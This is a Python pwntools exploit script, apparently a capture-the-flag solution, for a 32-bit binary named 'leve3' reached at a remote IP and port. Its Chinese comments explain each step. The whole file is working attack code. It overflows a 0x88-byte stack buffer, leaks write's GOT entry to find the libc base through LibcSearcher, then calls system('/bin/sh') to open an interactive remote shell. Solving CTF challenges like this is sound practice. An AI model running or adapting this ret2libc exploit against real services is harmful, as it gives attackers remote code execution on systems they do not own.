# -*- coding: utf-8 -*-
from pwn import*
from LibcSearcher import *
# context.log_level = "debug"

local = 0
if local:         #if else 使用选择本地或者远程
	p = process('./leve3')
else:
	p = remote("111.198.29.45", 38634)

elf = ELF("./leve3")#未开启aslr，用这个找方便一点
read_plt = elf.plt["read"]
write_plt = elf.plt["write"]
write_got = elf.got["write"]
main_addr = elf.symbols["main"]
p.recv()#这句很重要应该是接收一开始的input，缺少导致程序失败
payload  = "a" * 0x88+ p32(0x12345678)+p32(write_plt)+p32(main_addr)
payload +=p32(1)+p32(write_got) +p32(4)   #write(1, addr, 4)从addr开始读取4个字节数据，泄露write在程序中的真实地址
p.sendline(payload)
write_leak = u32(p.recv()[:4])
print "[*]write_leak:" + hex(write_leak)
libc = LibcSearcher('write',write_leak)#先传入地址
libc_base = write_leak - libc.dump('write')    #libc.dump()获取write在libc中的地址，从而计算偏移量
print "[*]libc_base:" + hex(libc_base)
sys_addr = libc_base + libc.dump("system")    #获取函数在libc中的真实地址
print "[*]sys_addr:" + hex(sys_addr)
bin_sh_addr = libc_base + libc.dump("str_bin_sh")  #这里是在已经有点libc本地库里面找偏移
print "[*]bin_sh_addr:" + hex(bin_sh_addr)
p.recv()
payload2  = "a" * 0x88 + p32(0x12345678)+p32(sys_addr)+p32(0x12345678)+p32(bin_sh_addr)
p.sendline(payload2)
p.interactive()
